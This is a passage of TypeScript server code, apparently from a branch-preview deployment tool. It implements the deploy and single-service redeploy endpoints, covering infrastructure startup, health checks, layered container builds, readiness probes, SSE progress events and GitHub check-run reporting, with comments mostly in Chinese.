    if (deployProject?.cloneStatus && deployProject.cloneStatus !== 'ready') {
      const statusMsg: Record<string, string> = {
        pending: '项目尚未开始克隆。请先 POST /api/projects/' + deployProject.id + '/clone',
        cloning: '项目正在克隆中，请等待完成后重试。',
        error: '项目上次克隆失败，请先重试克隆：' + (deployProject.cloneError || '未知错误'),
      };
      res.status(409).json({
        error: 'project_not_ready',
        cloneStatus: deployProject.cloneStatus,
        message: statusMsg[deployProject.cloneStatus] || `项目克隆状态异常: ${deployProject.cloneStatus}`,
      });
      return;
    }

    // P4 Part 17 (G2 fix): scope build profiles by the branch's project
    // so a deploy in project A doesn't pull in B's profiles. Pre-Part 3
    // branches default to 'default' (the legacy migration target).
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');
    if (profiles.length === 0) {
      res.status(400).json({ error: '尚未配置构建配置，请先添加至少一个构建配置。' });
      return;
    }

    // Phase 8 — env required check:必填项未填则 412 Precondition Failed,UI 弹窗强制感知
    // 用户可以"承诺会跑起来"按 ?ignoreRequired=1 query 强制 deploy(降级路径,不推荐)
    const ignoreRequired = req.query?.ignoreRequired === '1' || req.query?.ignoreRequired === 'true';
    if (!ignoreRequired && entry.projectId) {
      const missingRequired = stateService.getMissingRequiredEnvKeys(entry.projectId);
      if (missingRequired.length > 0) {
        const meta = stateService.getEnvMeta(entry.projectId);
        res.status(412).json({
          error: 'required_env_missing',
          message: `还有 ${missingRequired.length} 项必填环境变量未填,deploy 已 block。请到「项目环境变量」补齐:${missingRequired.join(', ')}`,
          missingRequiredEnvKeys: missingRequired,
          // 把 hint 也带上,前端弹窗直接显示
          hints: Object.fromEntries(missingRequired.map((k) => [k, meta[k]?.hint || ''])),
          // 用户硬要 deploy 的逃生口
          escapeHatch: { hint: '附加 ?ignoreRequired=1 query 可跳过此检查(不推荐,可能跑不起来)' },
        });
        return;
      }
    }

    // ── Cluster dispatch decision ──
    //
    // Before touching the local deploy path, decide whether this branch
    // should be built on a remote executor. The request body can override
    // the auto-selection with { targetExecutorId: "executor-xxx" }; otherwise
    // the dispatcher picks based on current load. Returns null for the local
    // path (embedded master or no cluster), which is the previous behavior.
    const explicitTarget = (req.body?.targetExecutorId as string | undefined) || undefined;
    const remoteTarget = resolveDeployTarget(entry, explicitTarget);
    if (remoteTarget) {
      // Clear any stale error + clear the local services map since we're
      // handing this branch off to the remote — the master isn't running
      // containers for it, the executor is.
      entry.errorMessage = undefined;
      await proxyDeployToExecutor(remoteTarget, entry, res);
      return;
    }

    // Local path: if we were previously dispatched to a remote executor,
    // clear the sticky ownership so GET /api/branches stops reporting the
    // wrong placement.
    if (entry.executorId && registry) {
      const stillRemote = registry.getAll().find(n => n.id === entry.executorId);
      if (stillRemote?.role === 'embedded' || !stillRemote) {
        entry.executorId = undefined;
      }
    }

    initSSE(res);

    const opLog: OperationLog = {
      type: 'build',
      startedAt: new Date().toISOString(),
      status: 'running',
      events: [],
    };

    function logEvent(ev: OperationLogEvent) {
      opLog.events.push(ev);
      sendSSE(res, 'step', ev);
      logDeploy(id, `[${ev.status}] ${ev.title || ev.step}${ev.log ? ' — ' + ev.log : ''}`);
    }

    try {
      logDeploy(id, '开始部署');

      // ── Capacity check (v3.1) ──
      // Emit a warning if the host is already over-subscribed. When the
      // warm-pool scheduler is enabled it will evict LRU branches automatically;
      // when it's disabled (default) the warning is the user's only signal
      // that they're at risk of OOM. Non-blocking so disabled setups keep
      // their existing behavior.
      const cap = computeCapacity();
      if (cap.current >= cap.max) {
        const msg = `容量超售: ${cap.current}/${cap.max} 容器 (${cap.totalMemGB}GB 宿主机). 建议启用 scheduler 或手动停止部分分支容器.`;
        logEvent({ step: 'capacity-warn', status: 'warning', title: msg, timestamp: new Date().toISOString() });
        logDeploy(id, `⚠ ${msg}`);
      }

      // Clear previous error state on new deploy
      entry.errorMessage = undefined;
      for (const svc of Object.values(entry.services)) {
        if (svc.errorMessage) svc.errorMessage = undefined;
      }
      const __prevStatus = entry.status;
      entry.status = 'building';
      // Live UI: surface the "building" transition to subscribed dashboards
      // so the branch card can flip to a spinner immediately on deploy kick-
      // off, not several seconds later when the first SSE step arrives.
      branchEvents.emitEvent({
        type: 'branch.status',
        payload: {
          branchId: id, projectId: entry.projectId,
          status: 'building', previousStatus: __prevStatus, ts: nowIso(),
        },
      });

      // ── GitHub Checks integration ──
      // Priority for the commit SHA fed to the check run:
      //   1. req.body.commitSha — the authoritative value from the
      //      webhook-originated dispatcher, pinned at webhook-handling
      //      time so concurrent pushes can't race it
      //   2. entry.githubCommitSha — stored on the branch by the push
      //      handler (same value in the normal flow)
      //   3. current worktree HEAD — fallback for UI-triggered deploys
      // If none of the above resolve, the check-run path is a no-op.
      const bodyCommitSha = typeof req.body?.commitSha === 'string'
        && /^[0-9a-f]{7,40}$/i.test(req.body.commitSha)
        ? req.body.commitSha : undefined;
      if (bodyCommitSha) {
        entry.githubCommitSha = bodyCommitSha;
      } else if (entry.githubRepoFullName && !entry.githubCommitSha) {
        try {
          const sha = await shell.exec('git rev-parse HEAD', { cwd: entry.worktreePath });
          if (sha.exitCode === 0) {
            entry.githubCommitSha = sha.stdout.trim();
          }
        } catch {
          /* non-fatal — check run just won't fire */
        }
      }
      stateService.save();
      // Open an in-progress check run — best effort, errors logged not
      // thrown (so GitHub connectivity issues don't block the deploy).
      await checkRunRunner.ensureOpen(entry);

      // Pull latest code
      logEvent({ step: 'pull', status: 'running', title: '正在拉取最新代码...', timestamp: new Date().toISOString() });
      await checkRunRunner.progress(entry, {
        title: '拉取最新代码…',
        summary: `分支: \`${entry.branch}\`\n阶段: git fetch + reset`,
        force: true,
      });
      const pullResult = await worktreeService.pull(entry.branch, entry.worktreePath);
      logEvent({ step: 'pull', status: 'done', title: `已拉取: ${pullResult.head}`, detail: pullResult as unknown as Record<string, unknown>, timestamp: new Date().toISOString() });

      // Clear pinned commit — deploy always restores to branch HEAD
      if (entry.pinnedCommit) {
        entry.pinnedCommit = undefined;
        logEvent({ step: 'pull', status: 'done', title: '已取消固定提交，恢复到分支最新', timestamp: new Date().toISOString() });
      }
      stateService.save();

      // ── Ensure required infrastructure is running ──
      // A profile can depend on project infra such as mongodb/redis and use
      // env templates like ${CDS_MONGODB_PORT}. Those CDS_* vars only exist
      // after the infra container is running, so deploy should bring required
      // infra up before resolving app service env, matching Railway-style
      // service references instead of asking users to copy ports manually.
      //
      // Phase 2.5 (2026-05-01):决策逻辑抽到 computeRequiredInfra 纯函数,
      // 便于跨项目同名 / stale state vs docker 等场景单测。详见
      // services/deploy-infra-resolver.ts 注释 + tests/services/deploy-infra-resolver.test.ts。
      const projectInfra = stateService.getInfraServicesForProject(entry.projectId || 'default');
      const actualInfraState = await containerService.discoverInfraContainers();
      const requiredInfraIds = computeRequiredInfra(profiles, projectInfra, actualInfraState);
      for (const infraId of requiredInfraIds) {
        const infra = stateService.getInfraServiceForProjectAndId(entry.projectId || 'default', infraId);
        // Phase 2 fix:不再用 infra.status === 'running' 跳过 — requiredInfraIds 已经
        // 经过 docker 实际状态过滤(actualInfraState),如果 stale state 写 running 但
        // 容器实际不在,这里不能 trust state。只 skip 真正不存在的 infra。
        if (!infra) continue;
        logEvent({
          step: `infra-${infra.id}`,
          status: 'running',
          title: `正在启动依赖基础设施 ${infra.name || infra.id}...`,
          timestamp: new Date().toISOString(),
        });
        let startedInfra = infra;
        try {
          startedInfra = await startInfraWithPortRetry(infra, entry.projectId || 'default');
        } catch (err) {
          const message = (err as Error).message;
          stateService.updateInfraService(infra.id, { status: 'error', errorMessage: message }, entry.projectId || 'default');
          logEvent({
            step: `infra-${infra.id}`,
            status: 'error',
            title: `${infra.name || infra.id} 启动失败`,
            log: message,
            timestamp: new Date().toISOString(),
          });
          throw err;
        }
        stateService.updateInfraService(startedInfra.id, { status: 'running', errorMessage: undefined }, entry.projectId || 'default');
        logEvent({
          step: `infra-${startedInfra.id}`,
          status: 'done',
          title: `${startedInfra.name || startedInfra.id} 已启动 :${startedInfra.hostPort}`,
          timestamp: new Date().toISOString(),
        });
      }
      if (requiredInfraIds.size > 0) stateService.save();

      // ── Phase 7 fix(B12,2026-05-01) — wait for infra service_healthy ──
      // CDS 历史 dependsOn 实现只达到 service_started(容器在跑),但很多
      // 应用 image 的 ENTRYPOINT 启动后立即连 db,如果 db healthcheck
      // 还没 pass,应用 connect → ECONNREFUSED → 容器 exit 2。Twenty 实战
      // 暴露:server image entrypoint 自跑 psql,db 5432 端口已 listening
      // 但 healthcheck 还在 starting → server 连失败 exit。
      //
      // 修法:起完 infra 后、起 app 前,对每个有 healthcheck 配置的 infra
      // 轮询 docker inspect health,直到 healthy 或 60s 超时。无 healthcheck
      // 的 infra 跳过(不阻塞)。
      const infraToWait = stateService.getInfraServicesForProject(entry.projectId || 'default')
        .filter(s => s.status === 'running' && s.healthCheck);
      for (const infra of infraToWait) {
        const stepId = `infra-${infra.id}-healthy`;
        logEvent({
          step: stepId, status: 'running',
          title: `等待 ${infra.name || infra.id} healthcheck 通过…`,
          timestamp: new Date().toISOString(),
        });
        const HEALTH_TIMEOUT_MS = 60_000;
        const HEALTH_INTERVAL_MS = 1500;
        const startedAt = Date.now();
        let healthy = false;
        let lastStatus = 'unknown';
        while (Date.now() - startedAt < HEALTH_TIMEOUT_MS) {
          const status = await containerService.getInfraHealth(infra.containerName);
          lastStatus = status;
          if (status === 'healthy') { healthy = true; break; }
          // 'none' 表示该容器没配 healthcheck — 视为通过(不阻塞)
          if (status === 'none') { healthy = true; break; }
          if (status === 'unhealthy') break;  // 立刻报错
          await new Promise(r => setTimeout(r, HEALTH_INTERVAL_MS));
        }
        if (!healthy) {
          logEvent({
            step: stepId, status: 'error',
            title: `${infra.name || infra.id} healthcheck 未通过(${lastStatus},${HEALTH_TIMEOUT_MS / 1000}s 内)`,
            log: '应用容器可能在 db 真正 ready 之前抢跑;扩大 healthcheck retries 或调大 HEALTH_TIMEOUT_MS。',
            timestamp: new Date().toISOString(),
          });
          // 非致命:继续往下跑,让应用层报真实错误
        } else {
          logEvent({
            step: stepId, status: 'done',
            title: `${infra.name || infra.id} healthy ✓`,
            timestamp: new Date().toISOString(),
          });
        }
      }

      // ── Compute startup layers (topological sort by dependsOn) ──
      // P4 Part 17 (G2 fix): scope infra by the branch's project so the
      // dependency resolver only sees infra services actually owned by
      // this project. Avoids cross-project bleed where project A's
      // dependsOn references could resolve to project B's mongo.
      const infraIds = new Set(
        stateService.getInfraServicesForProject(entry.projectId || 'default')
          .filter(s => s.status === 'running')
          .map(s => s.id),
      );

      const { layers, warnings: topoWarnings } = topoSortLayers(
        profiles,
        p => p.id,
        p => p.dependsOn ?? [],
        infraIds,
      );

      // ── Trace: dependency graph + layer plan ──
      const depGraph: Record<string, string[]> = {};
      for (const p of profiles) {
        if (p.dependsOn && p.dependsOn.length > 0) depGraph[p.id] = p.dependsOn;
      }
      logEvent({
        step: 'startup-plan',
        status: 'info',
        title: `启动计划: ${layers.length} 层, ${profiles.length} 服务`,
        detail: {
          dependencyGraph: depGraph,
          layers: layers.map(l => ({ layer: l.layer, services: l.items.map(p => p.id) })),
          resolvedInfra: Array.from(infraIds),
          ...(topoWarnings.length > 0 ? { warnings: topoWarnings } : {}),
        },
        timestamp: new Date().toISOString(),
      });

      // ── Pre-allocate ports synchronously (before parallel execution) ──
      for (const profile of profiles) {
        if (!entry.services[profile.id]) {
          const hostPort = stateService.allocatePort(config.portStart);
          entry.services[profile.id] = {
            profileId: profile.id,
            containerName: `cds-${id}-${profile.id}`,
            hostPort,
            status: 'idle',
          };
        }
      }
      stateService.save();

      // ── Execute layer by layer (parallel within each layer) ──
      for (let layerIdx = 0; layerIdx < layers.length; layerIdx++) {
        const layer = layers[layerIdx];
        const layerServiceNames = layer.items.map(p => p.name).join(', ');
        logEvent({
          step: `layer-${layer.layer}`,
          status: 'running',
          title: `启动第 ${layer.layer} 层: ${layerServiceNames}`,
          timestamp: new Date().toISOString(),
        });
        // Progress PATCH to GitHub so PR reviewers refreshing the Checks
        // panel see "构建第 X/Y 层 (services...)" instead of a stale
        // "Deploying to CDS…" for the entire build. Force=true so layer
        // transitions always push even inside the 5s throttle window.
        await checkRunRunner.progress(entry, {
          title: `构建第 ${layerIdx + 1}/${layers.length} 层`,
          summary: `分支 \`${entry.branch}\` 正在并行构建: ${layerServiceNames}`,
          force: true,
        });

        const layerStartTime = Date.now();

        await Promise.all(layer.items.map(async (profile) => {
          // Resolve baseline → branch override → deploy-mode override
          const effectiveProfile = resolveEffectiveProfile(profile, entry);
          const branchOverride = entry.profileOverrides?.[profile.id];
          const activeMode = effectiveProfile.activeDeployMode;
          const modeLabel = activeMode && effectiveProfile.deployModes?.[activeMode]
            ? ` [${effectiveProfile.deployModes[activeMode].label}]`
            : '';
          const overrideLabel = branchOverride ? ' (分支自定义)' : '';
          const serviceStartTime = Date.now();
          logEvent({
            step: `build-${profile.id}`,
            status: 'running',
            title: `正在构建 ${profile.name}${modeLabel}${overrideLabel}...`,
            timestamp: new Date().toISOString(),
          });

          const svc = entry.services[profile.id];
          svc.status = 'building';

          try {
            const mergedEnv = getMergedEnv(entry.projectId);

            // ── Trace: resolved CDS_* env vars for this service ──
            const cdsVars: Record<string, string> = {};
            for (const [k, v] of Object.entries(mergedEnv)) {
              if (k.startsWith('CDS_')) cdsVars[k] = v;
            }
            logEvent({
              step: `env-${profile.id}`,
              status: 'info',
              title: `${effectiveProfile.name} 环境变量`,
              detail: {
                cdsVars: maskSecrets(cdsVars),
                profileEnvKeys: Object.keys(effectiveProfile.env ?? {}),
                deployMode: effectiveProfile.activeDeployMode || 'default',
                branchOverrideKeys: branchOverride ? Object.keys(branchOverride) : [],
              },
              timestamp: new Date().toISOString(),
            });

            await containerService.runService(entry, effectiveProfile, svc, (chunk) => {
              sendSSE(res, 'log', { profileId: profile.id, chunk });
              for (const line of chunk.split('\n')) {
                if (line.trim()) {
                  logDeploy(id, line);
                  // Also store container output in operation log for historical viewing
                  opLog.events.push({
                    step: `log-${profile.id}`,
                    status: 'info',
                    title: line.trim(),
                    timestamp: new Date().toISOString(),
                  });
                }
              }
            }, mergedEnv);

            // Phase 1 passed (container alive). Enter 'starting' and gate the
            // transition to 'running' on either a startup-log signal or an
            // HTTP/TCP readiness probe. Closes the gap that used to surface
            // as Cloudflare 502 while the container was alive but the app
            // wasn't yet listening. See .claude/rules/cds-auto-deploy.md.
            svc.status = 'starting';
            stateService.save();
            // Broadcast service-level transition so Dashboard + preview
            // waiting page update without waiting for the next deploy SSE
            // event.
            branchEvents.emitEvent({
              type: 'branch.status',
              payload: { branchId: id, projectId: entry.projectId, status: 'starting', previousStatus: 'building', ts: nowIso() },
            });

            let ready = false;
            if (profile.startupSignal) {
              const elapsed = Date.now() - serviceStartTime;
              logEvent({
                step: `build-${profile.id}`,
                status: 'done',
                title: `${profile.name} 容器已启动，等待启动信号 :${svc.hostPort}`,
                detail: { elapsedMs: elapsed, startupSignal: profile.startupSignal },
                timestamp: new Date().toISOString(),
              });

              ready = await containerService.waitForStartupSignal(svc.containerName, profile.startupSignal, (chunk) => {
                for (const line of chunk.split('\n')) {
                  if (line.trim()) logDeploy(id, line);
                }
              });
            }

            // Always run the port-level readiness probe (even after a
            // startup signal succeeded) so we never mark a service running
            // while its host-port binding is still racing. Default TCP
            // probe when no `readinessProbe` is configured.
            if (!profile.startupSignal || ready) {
              const probeReady = await containerService.waitForReadiness(
                svc.hostPort,
                profile.readinessProbe,
                (info) => {
                  sendSSE(res, 'probe', {
                    profileId: profile.id,
                    attempt: info.attempt,
                    max: info.max,
                    stage: info.stage,
                    ok: info.ok,
                    error: info.error,
                  });
                },
                (chunk) => {
                  for (const line of chunk.split('\n')) {
                    if (line.trim()) logDeploy(id, line);
                  }
                },
              );
              ready = ready ? probeReady : probeReady;
            }

            if (ready) {
              svc.status = 'running';
              logDeploy(id, `${profile.name} 启动成功 ✓`);
              const elapsed = Date.now() - serviceStartTime;
              logEvent({
                step: `build-${profile.id}`,
                status: 'done',
                title: `${profile.name} 运行于 :${svc.hostPort}`,
                detail: { elapsedMs: elapsed },
                timestamp: new Date().toISOString(),
              });
            } else {
              svc.status = 'error';
              svc.errorMessage = '就绪探测超时：容器已启动但端口未在超时时间内响应';
              logDeploy(id, `${profile.name} 就绪探测超时`);
              logEvent({
                step: `build-${profile.id}`,
                status: 'error',
                title: `${profile.name} 就绪探测超时`,
                detail: { elapsedMs: Date.now() - serviceStartTime },
                timestamp: new Date().toISOString(),
              });
            }
            stateService.save();
          } catch (err) {
            svc.status = 'error';
            svc.errorMessage = (err as Error).message;
            const elapsed = Date.now() - serviceStartTime;
            logEvent({
              step: `build-${profile.id}`,
              status: 'error',
              title: `${profile.name} 失败`,
              log: (err as Error).message,
              detail: { elapsedMs: elapsed },
              timestamp: new Date().toISOString(),
            });
          }
        }));

        const layerElapsed = Date.now() - layerStartTime;
        logEvent({
          step: `layer-${layer.layer}`,
          status: 'done',
          title: `第 ${layer.layer} 层完成`,
          detail: { elapsedMs: layerElapsed },
          timestamp: new Date().toISOString(),
        });
      }

      // ── Update overall status ──
      //
      // 2026-04-27 (用户反馈"GitHub Checks 一直失败但日志看不到原因"):
      //
      // 历史 bug: hasError 之前是 `Object.values(entry.services).some(s.status==='error')`，
      // 这意味着 entry.services 里**任何**残留的 zombie service（比如旧
      // buildProfile 已删但 entry.services 里它的 entry 还在 status='error'）
      // 都会把 hasError 拉成 true，导致 opLog.status='error' + GitHub
      // check-run conclusion='failure'，但 events 里完全没有这个服务的
      // 痕迹（因为本次 deploy 根本没动它）。
      //
      // 修复: 只考虑本次 deploy 实际参与的 services（profileId 在 profiles
      // 列表里）。zombie service 单独 logEvent('zombie-service', 'warning')
      // 让运营能立即从事件流里发现孤儿条目并手动清理。
      const activeProfileIds = new Set(profiles.map((p) => p.id));
      const activeServices = Object.entries(entry.services).filter(([sid]) =>
        activeProfileIds.has(sid),
      );
      const zombieServices = Object.entries(entry.services).filter(
        ([sid]) => !activeProfileIds.has(sid),
      );
      for (const [sid, svc] of zombieServices) {
        if (svc.status === 'error') {
          logEvent({
            step: 'zombie-service',
            status: 'warning',
            title: `服务 "${sid}" 已不在 startup-plan 里但状态停留在 error，被忽略`,
            log: `这通常是旧 buildProfile 被删/改名后的残留。如确认无用，请通过 reset 接口清理 entry.services["${sid}"]。原 errorMessage="${svc.errorMessage || ''}"`,
            detail: { profileId: sid, status: svc.status, port: svc.hostPort, container: svc.containerName },
            timestamp: new Date().toISOString(),
          });
        }
      }
      const activeStatuses = activeServices.map(([, s]) => s.status);
      const hasRunning = activeStatuses.some((s) => s === 'running');
      const hasStarting = activeStatuses.some((s) => s === 'starting');
      const hasError = activeStatuses.some((s) => s === 'error');
      const failedNames = activeServices
        .filter(([, s]) => s.status === 'error')
        .map(([, s]) => s.profileId);
      const failedReasons = activeServices
        .filter(([, s]) => s.status === 'error')
        .map(([sid, svc]) => `${sid}: ${svc.errorMessage || '启动失败'}`);
      if (hasError) {
        const reason = failedReasons.join('\n');
        entry.errorMessage = reason || `失败服务: ${failedNames.join(', ')}`;
        logEvent({
          step: 'deploy-summary',
          status: 'error',
          title: `部署失败: ${failedNames.join(', ') || '未知服务'}`,
          log: reason,
          detail: { failedServices: failedNames },
          timestamp: new Date().toISOString(),
        });
      } else {
        entry.errorMessage = undefined;
      }
      const __statusPrev = entry.status;
      entry.status = hasError ? 'error' : hasRunning ? 'running' : hasStarting ? 'starting' : 'error';
      entry.lastAccessedAt = new Date().toISOString();

      opLog.status = hasError ? 'error' : 'completed';
      opLog.finishedAt = new Date().toISOString();
      stateService.appendLog(id, opLog);
      stateService.save();

      // Live UI: final status transition so the branch card stops
      // spinning (running/error/starting). Same envelope shape as the
      // 'building' emit earlier so the client can render transitions
      // with one branch.
      branchEvents.emitEvent({
        type: 'branch.status',
        payload: {
          branchId: id, projectId: entry.projectId,
          status: entry.status, previousStatus: __statusPrev, ts: nowIso(),
        },
      });

      // 2026-04-27 (Bugbot review): failedNames 必须用 activeServices 过滤，
      // 不然 zombie service（旧 buildProfile 已删但 entry.services 残留 status='error'）
      // 会和真实失败服务一起出现在 completeMsg / activity log note 里，
      // 误导运营。zombie 已经在上面 logEvent('zombie-service') 单独可见。
      const completeMsg = hasError
        ? `部分服务启动失败: ${failedNames.join(', ')}`
        : '所有服务已启动';
      logDeploy(id, `部署完成: ${completeMsg}`);
      // PR_C.3: 部署计数 + 时间戳 + activity log（成功/失败分别记）
      stateService.incrementBranchStat(id, 'deployCount');
      if (!hasError) stateService.stampBranchTimestamp(id, 'lastDeployAt');
      stateService.appendActivityLog(entry.projectId, {
        type: hasError ? 'deploy-failed' : 'deploy',
        branchId: id,
        branchName: entry.branch,
        actor: resolveActorForActivity(req),
        note: hasError ? `失败服务: ${failedNames.join(', ')}` : undefined,
      });
      stateService.save();
      sendSSE(res, 'complete', {
        message: completeMsg,
        services: entry.services,
      });

      // Phase 4: auto-smoke after a green deploy (best-effort; never
      // blocks the deploy conclusion, never throws out of the handler).
      // 2026-04-27: 单独 try/catch 让 smoke 的异常落到 opLog.events 里
      // 而不是被外层 catch 吞掉只剩 entry.errorMessage（GitHub Checks 看
      // 到 "Deploy failed" 但 /api/branches/:id/logs 全是 done 的根因）。
      let smokeResult: Awaited<ReturnType<typeof maybeRunAutoSmoke>> = null;
      try {
        smokeResult = await maybeRunAutoSmoke(res, entry, hasError);
      } catch (err) {
        const msg = (err as Error)?.message || String(err);
        const stack = (err as Error)?.stack || '';
        logEvent({
          step: 'auto-smoke',
          status: 'error',
          title: `自动冒烟阶段抛出: ${msg.slice(0, 120)}`,
          log: stack ? `${msg}\n${stack}` : msg,
          timestamp: new Date().toISOString(),
        });
      }

      // Finalize the GitHub check run (best-effort). `hasError` decides
      // success vs failure; the preview URL surfaces in the check-run
      // summary so GitHub's "Details" button jumps straight to preview.
      // logTail = last 80 events rendered as "[status] step: title"
      // lines, surfaced under "Show more" in GitHub's Checks panel.
      //
      // Phase 5: if auto-smoke ran, fold its result into the check-run
      // conclusion so the PR Checks panel shows "CDS Deploy" red when
      // deploy is green but smoke tripped (most useful signal for PR
      // reviewers — "deployed fine but API is broken").
      const smokeOk = smokeResult
        ? smokeResult.exitCode === 0 && smokeResult.failedCount === 0
        : true;
      const finalConclusion = hasError || !smokeOk ? 'failure' : 'success';
      const summary = smokeResult
        ? `${completeMsg} | 冒烟 ${smokeOk ? '通过' : '失败'} pass=${smokeResult.passedCount} fail=${smokeResult.failedCount} (${smokeResult.elapsedSec}s)`
        : completeMsg;
      // 2026-04-27: 同上，把 finalize 的 throw 落到 opLog.events 里。
      try {
        await checkRunRunner.finalize(entry, {
          conclusion: finalConclusion,
          summary,
          previewUrl: checkRunRunner.derivePreviewUrl(entry),
          logTail: opLog.events.slice(-80).map((ev) => {
            const st = ev.status || '?';
            const ttl = ev.title || ev.step;
            return `[${st}] ${ev.step}: ${ttl}`;
          }).join('\n'),
        });
      } catch (err) {
        const msg = (err as Error)?.message || String(err);
        const stack = (err as Error)?.stack || '';
        logEvent({
          step: 'check-run-finalize',
          status: 'error',
          title: `回写 GitHub check run 失败: ${msg.slice(0, 120)}`,
          log: stack ? `${msg}\n${stack}` : msg,
          detail: { conclusion: finalConclusion },
          timestamp: new Date().toISOString(),
        });
      }
    } catch (err) {
      // 2026-04-27 (用户明确反馈"日志看不到原因"): 这里以前只把错误塞进
      // entry.errorMessage + sendSSE，opLog.events 里没有任何 error 事件，
      // 导致 GET /api/branches/:id/logs 显示全部 done 但 entry.status=error
      // GitHub Checks 也只看到 "Deploy failed" 没有阶段信息。
      // 现在统一通过 logEvent() 写入事件，让事后排查能在事件流中看到。
      const errMsg = (err as Error)?.message || String(err);
      const errStack = (err as Error)?.stack || '';
      logEvent({
        step: 'deploy',
        status: 'error',
        title: `部署整体失败: ${errMsg.slice(0, 200)}`,
        log: errStack ? `${errMsg}\n${errStack}` : errMsg,
        timestamp: new Date().toISOString(),
      });
      entry.status = 'error';
      entry.errorMessage = errMsg;
      opLog.status = 'error';
      opLog.finishedAt = new Date().toISOString();
      stateService.appendLog(id, opLog);
      stateService.save();
      logDeploy(id, `部署失败: ${errMsg}`);
      sendSSE(res, 'error', { message: errMsg });
      try {
        await checkRunRunner.finalize(entry, {
          conclusion: 'failure',
          summary: errMsg || '部署失败',
          previewUrl: checkRunRunner.derivePreviewUrl(entry),
          logTail: opLog.events.slice(-80).map((ev) => {
            const st = ev.status || '?';
            const ttl = ev.title || ev.step;
            return `[${st}] ${ev.step}: ${ttl}`;
          }).join('\n'),
        });
      } catch (finalizeErr) {
        // 兜底：即使 finalize 二次失败，也别让 throw 冒泡破坏 finally
        const m = (finalizeErr as Error)?.message || String(finalizeErr);
        logEvent({
          step: 'check-run-finalize',
          status: 'error',
          title: `失败兜底回写 GitHub check 也失败: ${m.slice(0, 120)}`,
          log: m,
          timestamp: new Date().toISOString(),
        });
      }
    } finally {
      res.end();
    }
  });

  // ── Redeploy a single service (SSE stream) ──

  router.post('/branches/:id/deploy/:profileId', async (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    // P4 Part 17 (G2 fix): scope by the branch's project so a
    // single-service redeploy can't accidentally pick up a same-named
    // profile from a different project.
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');
    const profile = profiles.find(p => p.id === profileId);
    if (!profile) {
      res.status(404).json({ error: `构建配置 "${profileId}" 不存在` });
      return;
    }

    initSSE(res);

    const opLog: OperationLog = {
      type: 'build',
      startedAt: new Date().toISOString(),
      status: 'running',
      events: [],
    };

    function logEvent(ev: OperationLogEvent) {
      opLog.events.push(ev);
      sendSSE(res, 'step', ev);
      logDeploy(id, `[${ev.status}] ${ev.title || ev.step}${ev.log ? ' — ' + ev.log : ''}`);
    }

    try {
      logDeploy(id, `开始部署服务 ${profile.name}`);

      // Clear previous error state on new deploy
      entry.errorMessage = undefined;
      const existingSvc = entry.services[profile.id];
      if (existingSvc?.errorMessage) existingSvc.errorMessage = undefined;
      stateService.save();

      // Pull latest code
      logEvent({ step: 'pull', status: 'running', title: '正在拉取最新代码...', timestamp: new Date().toISOString() });
      const pullResult = await worktreeService.pull(entry.branch, entry.worktreePath);
      logEvent({ step: 'pull', status: 'done', title: `已拉取: ${pullResult.head}`, detail: pullResult as unknown as Record<string, unknown>, timestamp: new Date().toISOString() });

      // Clear pinned commit — deploy always restores to branch HEAD
      if (entry.pinnedCommit) {
        entry.pinnedCommit = undefined;
        logEvent({ step: 'pull', status: 'done', title: '已取消固定提交，恢复到分支最新', timestamp: new Date().toISOString() });
        stateService.save();
      }

      // Resolve baseline → branch override → deploy-mode override
      const effectiveProfile = resolveEffectiveProfile(profile, entry);
      const branchOverride = entry.profileOverrides?.[profile.id];
      const activeMode = effectiveProfile.activeDeployMode;
      const modeLabel = activeMode && effectiveProfile.deployModes?.[activeMode]
        ? ` [${effectiveProfile.deployModes[activeMode].label}]`
        : '';
      const overrideLabel = branchOverride ? ' (分支自定义)' : '';

      // Build & run the single profile
      logEvent({ step: `build-${profile.id}`, status: 'running', title: `正在构建 ${profile.name}${modeLabel}${overrideLabel}...`, timestamp: new Date().toISOString() });

      if (!entry.services[profile.id]) {
        const hostPort = stateService.allocatePort(config.portStart);
        entry.services[profile.id] = {
          profileId: profile.id,
          containerName: `cds-${id}-${profile.id}`,
          hostPort,
          status: 'building',
        };
        stateService.save();
      }

      const svc = entry.services[profile.id];
      svc.status = 'building';

      try {
        const mergedEnv = getMergedEnv(entry.projectId);
        await containerService.runService(entry, effectiveProfile, svc, (chunk) => {
          sendSSE(res, 'log', { profileId: profile.id, chunk });
          for (const line of chunk.split('\n')) {
            if (line.trim()) logDeploy(id, line);
          }
        }, mergedEnv);

        // Enter 'starting' and gate transition on startup signal + readiness
        // probe (TCP+HTTP). Prevents the 502 window between `docker run` exit
        // and the app binding its port. See .claude/rules/cds-auto-deploy.md.
        svc.status = 'starting';
        stateService.save();
        logEvent({ step: `build-${profile.id}`, status: 'done', title: `${profile.name} 容器已启动，等待就绪 :${svc.hostPort}`, timestamp: new Date().toISOString() });

        let ready = false;
        if (profile.startupSignal) {
          const signalReady = await containerService.waitForStartupSignal(svc.containerName, profile.startupSignal, (chunk) => {
            for (const line of chunk.split('\n')) {
              if (line.trim()) logDeploy(id, line);
            }
          });
          ready = signalReady;
        }
        if (!profile.startupSignal || ready) {
          ready = await containerService.waitForReadiness(
            svc.hostPort,
            profile.readinessProbe,
            (info) => {
              sendSSE(res, 'probe', { profileId: profile.id, attempt: info.attempt, max: info.max, stage: info.stage, ok: info.ok, error: info.error });
            },
            (chunk) => {
              for (const line of chunk.split('\n')) {
                if (line.trim()) logDeploy(id, line);
              }
            },
          );
        }
        if (ready) {
          svc.status = 'running';
          logDeploy(id, `${profile.name} 启动成功 ✓`);
        } else {
          svc.status = 'error';
          svc.errorMessage = '就绪探测超时：容器已启动但端口未在超时时间内响应';
          logDeploy(id, `${profile.name} 就绪探测超时`);
        }
        stateService.save();
      } catch (err) {
        svc.status = 'error';
        svc.errorMessage = (err as Error).message;
        logEvent({ step: `build-${profile.id}`, status: 'error', title: `${profile.name} 失败`, log: (err as Error).message, timestamp: new Date().toISOString() });
      }

      // Update overall status
      const statuses = Object.values(entry.services).map(s => s.status);
      const hasRunning = statuses.some(s => s === 'running');
      const hasStarting = statuses.some(s => s === 'starting');
      entry.status = hasRunning ? 'running' : hasStarting ? 'starting' : 'error';
      entry.lastAccessedAt = new Date().toISOString();

      opLog.status = svc.status === 'running' ? 'completed' : 'error';
      opLog.finishedAt = new Date().toISOString();
      stateService.appendLog(id, opLog);
      stateService.save();

